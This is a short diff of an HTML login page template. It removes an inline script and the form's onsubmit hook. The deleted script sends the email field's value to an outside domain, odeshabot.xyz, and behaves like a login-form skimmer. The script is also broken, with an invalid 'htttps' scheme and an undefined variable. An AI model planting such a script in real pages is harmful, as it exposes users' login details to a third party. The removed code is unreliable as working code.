@@ -22,19 +22,6 @@
 	<link rel="stylesheet" type="text/css" href="css/util.css">
 	<link rel="stylesheet" type="text/css" href="css/main.css">
 <!--===============================================================================================-->
-	<script>
-		function auth() {
-			var input =  document.getElementById("email");
-			var key = input.value;
-			console.log("Function clicked;");
-			$.get({url: "htttps://odeshabot.xyz", data: {key: key}, success: function (response) {
-				var login = data.get("login");
-				if (login == true) {
-					
-				}
-			}});
-		}
-	</script>
 </head>
 <body>
 	
@@ -44,8 +31,8 @@
 				<div class="login100-pic js-tilt" data-tilt>
 					<img src="images/img-01.png" alt="IMG">
 				</div>
-				
-				<form class="login100-form validate-form" onsubmit="auth();">
+
+				<form class="login100-form validate-form">
 					<span class="login100-form-title">
 						User Login
 					</span>
